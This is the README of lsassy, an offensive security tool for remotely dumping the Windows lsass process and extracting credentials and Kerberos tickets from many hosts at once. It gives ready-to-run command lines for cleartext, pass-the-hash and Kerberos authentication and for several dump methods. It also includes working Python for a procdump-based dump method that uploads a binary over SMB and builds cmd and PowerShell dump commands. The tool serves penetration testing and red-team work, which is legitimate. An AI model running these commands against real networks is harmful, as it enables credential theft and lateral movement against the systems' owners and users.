# lsassy


[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=3.0.3&x2=0)](https://pypi.org/project/lsassy/) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)

<a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>

Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.

This tool uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

| Chapters                                     | Description                                             |
|----------------------------------------------|---------------------------------------------------------|
| [Warning](#warning)                          | Before using this tool, read this                       |
| [Installation](#installation)                | Lsassy installation                                     |
| [Basic usage](#basic-usage)                  | Basic lsassy usage                                      |
| [Advanced usage](#advanced-usage)            | Advanced lsassy usage with params explaination          |
| [Add dump method](#add-dump-method)          | How to add a custom lsass dump method                   |
| [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |
| [Official Discord](#official-discord-channel)| Official Discord channel                                |

## Warning

Although I have made every effort to make the tool stable, traces may be left if errors occur.

This tool can either leave some lsass dumps if it failed to delete it (even though it tries hard to do so) or leave a scheduled task running if it fails to delete it. This shouldn't happen, but it might. Now, you know, use it with caution.

## Installation

**lsassy** works with python >= 3.7

### pip (Recommended)

```bash
python3 -m pip install lsassy
```

### From source for development

```
python3 setup.py install
```

## Basic Usage

**lsassy** works out of the box on multiple targets (IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets)

```bash
lsassy [-d domain] -u user -p password targets
lsassy [-d domain] -u user -H [LM:]NT targets
```

By default, lsassy will try to dump lsass remotely using `comsvcs.dll` method, either via WMI or via a remote scheduled task.

### Kerberos

**lsassy** can authenticate with Kerberos. It requires a valid TGT in `KRB5CCNAME` environment variable. See [advanced usage](Lsassy-Advanced-Usage#kerberos) for more details.

```bash
lsassy -k targets
```


### Examples

```bash
 lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.0/24
 lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.1-10
 lsassy -d adsec.local -u pixis -p p4ssw0rd hosts.txt
 lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.1-192.168.1.10
```

## Advanced Usage

Different lsass dumping methods are implemented in **lsassy**, and some option are provided to give control to the user on how the tool will proceed.

### Internal working

**lsassy** is divided in modules

```
                   +-----------+
                   |   Writer  |
                   +-----+-----+
                         |
                         |
 +----------+      +-----+-----+    +---------+
 |  Parser  |------|   Core    |----| Session |
 +----------+      +-----+-----+    +---------+
                         |
                         |
                   +-----------+
                   |    Dump   |-+
                   |  Methods  | |-+    +----------+
                   +-----+-----+ | |----|   File   |
                     +-----------+ |    +----------+
                      +------------+
                         |
                         |
                   +-----------+
                   |    Exec   |-+
                   |  Methods  | |-+
                   +-----+-----+ | |
                     +-----------+ |
                      +------------+
```

#### Core module

This module is the orchestrator. It creates lsassy class with provided arguments and options, and then calls the different modules to retrieve credentials.

#### Logger module

This module is used for logging purpose.

#### File module

This is a layer built over Impacket to behave like a python built-in file object. It overrides methods like open, read, seek, or close.

#### Dumper module

This module is where all the dumping logic happens. Depending on the method used, it will execute code on remote host to dump lsass using provided method.

#### Parser module

This module relies on pypykatz and uses **lsassy** file module to remotely parse lsass dump

#### Writer module

This module handles the output part, either to the screen in different formats and/or write results to a file

### Dumping methods

This tool can dump lsass in different ways.

Dumping methods (`-m` or `--method`)
* comsvcs
* comsvcs_stealth
* dllinject
* procdump
* procdump_embedded
* dumpert
* dumpertdll
* ppldump
* ppldump_embedded

#### comsvcs method

This method **only uses built-in Windows files** to extract remote credentials. It uses **minidump** function from **comsvcs.dll** to dump **lsass** process.

#### Procdump method

This method uploads **procdump.exe** from SysInternals to dump **lsass** process. 

#### Dumpert method

This method uploads **dumpert.exe** from [outflanknl](https://github.com/outflanknl/Dumpert) to dump **lsass** process. 

#### Dumpertdll method

This method uploads **dumpert.dll** from [outflanknl](https://github.com/outflanknl/Dumpert) to dump **lsass** process. It will be run via rundll32 utility.

#### Options

For some dumping method, options are required, like procdump or dumpert path. These options can be set using `--options` or `-O` with a comma separated list of options in a `key=value` way.

```
... --options key=value,foo=bar
```

For example:

```bash
lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m procdump    -O procdump_path=/opt/Sysinternals/procdump.exe
lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m dumpert     -O dumpert_path=/opt/dumpert.exe
lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -m dumpertdll  -O dumpertdll_path=/opt/dumpert.dll
```

#### Parse only

You can choose to parse an already dumped lsass process by providing `--parse-only` switch, alongside with `--dump-path` and `--dump-name` parameters.

Note that if you choose this method, the **remote lsass dump won't be deleted**.

For example:

```bash
lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local --parse-only --dump-path "/Windows/Temp" --dump-name "lsass.dmp"
```

### Kerberos tickets harvesting

You can extract in-memory Kerberos tickets by using `-K [directory]` or `--kerberos-dir [directory]` parameter. It will extract and save Kerberos tickets in `kirbi` format in the provided output directory. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.

```bash
lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -K '/tmp/kerberos_tickets'
```

### Authentication methods

There are three different ways to authenticate against remote targets using **lsassy**. The only requirement is that the user needs to have local administration rights on the remote targets.

#### Cleartext credentials

First and most obvious one is by using clear text credentials. It can either be a local or domain user.

```bash
## Local user
lsassy -u pixis -p p4ssw0rd server01.adsec.local

## Domain user
lsassy -d adsec.local -u jsnow -p WinterIsComing server01.adsec.local
```

#### Pass-the-hash

It is also possible to authenticate using user's NT hash. You can either provide LM:NT or only NT version.

```bash
lsassy -d adsec.local -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.adsec.local
aad3b435b51404eeaad3b435b51404ee

## Or

lsassy -d adsec.local -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.adsec.local
```

#### Kerberos

You can also authenticate using Kerberos. For this to work, you will need to have a valid ticket saved on disk, and ticket's path needs to be provided in `KRB5CCNAME` environment variable. For testing purpose, this can be achieved using impacket **getTGT.py** tool.

```bash
getTGT.py adsec.local/jsnow:WinterIsComing -dc-ip dc01.adsec.local
```

This command will request a TGT and save it in `jsnow.ccache` file.

In order for **lsassy** to know which ticket to use, you'll need to explicitly set the ticket's path in `KRB5CCNAME` environment variable.

```bash
export KRB5CCNAME="/home/pixis/jsnow.ccache"
```

When it's correctly configured, you should be able to use that ticket for authentication using `-k` parameter. Since you're using this ticket, you don't need to provide other authentication information anymore.

```bash
lsassy -k server01.adsec.local
```

Note that for this to work, you will need a valid DNS configuration, either dynamic with a valid DNS server, or static using `hosts` file. Moreover, you should always use FQDN when generating tickets and using **lsassy**, i.e. use `server01.adsec.local` instead of `server01`.

### Output

#### Screen format

**lsassy** can output credentials in different formats using `--format` or `-f` flag

##### Pretty

Default format, nice and clean credentials are displayed with golden colors. In credz we trust.

```
lsassy [-d domain] -u user -p password --format pretty targets
```

##### Json

Displays result in json format. Can be useful when called from a script
```
lsassy [-d domain] -u user -p password --format json targets
```

##### Grep

Grepable output that can be useful in one-liners

```
lsassy [-d domain] -u user -p password --format grep targets
```

##### None

Doesn't display the result. Useful when using `--outfile`
```
lsassy [-d domain] -u user -p password targets --format none
```

#### Save in a file

Saves the result in a grepable format in provided file (`--outfile` or `-o`)
```
lsassy [-d domain] -u user -p password targets --format json --outfile /tmp/credentials.txt
```

#### Results filtering

If you want to only get users credentials, filtering out computers credentials, you can use `--users` flag
```
lsassy [-d domain] -u user -p password targets --users
```

#### Thread management

You can decide how many thread you want to use \[1-256\] using `--threads` parameter.

```
lsassy [-d domain] -u user -p password targets --threads 32
```


## Add dump method

There is a **dummy.py** file in **dumpmethod** directory. This file contains basic structure to create a new dump method functionnality.

### get_commands

This method is mandatory as it is the method that will be used to execute code on the remote host in order to dump lsass in some way. It **must** return a dictionnary with two items **cmd** and **pwsh**.

**cmd** command is a command understood by **cmd.exe** utility
**pwsh** command is a command understood by powershell (most of the time, **cmd** command is also valid in powershell)

```python
return {
    "cmd": cmd_command,
    "pwsh": pwsh_command
}
```

### (Optionnal) prepare

This method will be called **before** executing commands provided by **get_commands**. It can be used to upload files or check stuff

### (Optionnal) clean

This method will be called **after** executing commands provided by **get_commands**. It can be used to delete uploaded files or clean stuff.

### Example

Here is procdump example with some comments

```python
import logging
import os
import time

from lsassy.dumpmethod.idumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):

    """
    If your dumping method cannot produce a dumpfile with a custom dumpfile name, you must set this setting to False
    and uncomment 'dump_name' to provide expected dumpfile name on remote system.
    """
    custom_dump_name_support = True  # Default: True
    # dump_name              = ""    # Default: Random dumpfile name

    """
    If your dumping method cannot produce a dumpfile in a custom directory, you must set this setting to False
    and uncomment 'dump_share' and 'dump_path' to provide expected dumpfile location on remote system.
    """
    custom_dump_path_support = True  # Default: True
    # dump_share             = ""    # Default: "C$"
    # dump_path              = ""    # Default: "\\Windows\\Temp\\"

    def __init__(self, session):
        """
        __init__ is overloaded to create some instance variables
        """
        super().__init__(session)
        self.procdump = "procdump.exe"
        self.procdump_path = False
        self.procdump_remote_share = "C$"
        self.procdump_remote_path = "\\Windows\\Temp\\"

        self.procdump_uploaded = False

    def prepare(self, options):
        """
        Prepare method is overloaded so that we are able to
        - check if mandatory parameters are provided
        - upload procdump on the remote host.
        """
        self.procdump = options.get("procdump", self.procdump)
        self.procdump_path = options.get("procdump_path", self.procdump_path)
        self.procdump_remote_share = options.get("procdump_remote_share", self.procdump_remote_share)
        self.procdump_remote_path = options.get("procdump_remote_path", self.procdump_remote_path)

        if not self.procdump_path:
            logging.error("Missing procdump_path")
            return None

        if not os.path.exists(self.procdump_path):
            logging.error("{} does not exist.".format(self.procdump_path))
            return None

        # Upload procdump
        logging.debug('Copy {} to {}'.format(self.procdump_path, self.procdump_remote_path))
        with open(self.procdump_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump, p.read)
                logging.success("Procdump successfully uploaded")
                self.procdump_uploaded = True
                return True
            except Exception as e:
                logging.error("Procdump upload error", exc_info=True)
                return None

    def clean(self):
        """
        Clean method is overloaded so that we are able to delete procdump if it was uploaded
        """
        if self.procdump_uploaded:
            t = time.time()
            while True:
                try:
                    self._session.smb_session.deleteFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump)
                    logging.debug("Procdump successfully deleted")
                    return True
                except Exception as e:

                    if time.time() - t > 5:
                        logging.warning("Procdump deletion error.")
                        return False
                    logging.debug("Procdump deletion error. Retrying...")
                    time.sleep(0.2)

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        """
        get_commands method is overloaded as it is mandatory.
        Two different ways of dumping lsass with cmd.exe and powershell are provided and returned.
        """
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
            self.procdump_remote_path, self.procdump,
            self.dump_path, self.dump_name
        )
        pwsh_command = """{}{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
            self.procdump_remote_path, self.procdump,
            self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }

```

You can check dummy class for more comments and/or informations.

## Acknowledgments

![image](https://user-images.githubusercontent.com/11051803/127148091-6b52f38a-de64-4114-b1ef-465e65deacfb.png)

* [Kodoque](https://github.com/Kodoque1) for lsassy name
* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [SkelSec](http://twitter.com/skelsec) for Pypykatz, but also for his patience and help
* [mpgn](https://twitter.com/mpgn_x64) for his help and ideas
* [Cn33liz](https://twitter.com/Cneelis) for [Dumpert](https://github.com/outflanknl/Dumpert)
* [itm4n](https://twitter.com/itm4n) for [PPLDump](https://github.com/itm4n/PPLdump)
* [Matt Graeber](https://twitter.com/mattifestation) for [WER Technique](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
* [MrUn1k0d3r](https://twitter.com/MrUn1k0d3r) for [SMB Service Modification technique](https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/scshell.py)

## Official Discord Channel

[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/sEkn3aa)

## Known bugs

* Compiled versions don't include table_output because of some weird error with rich library
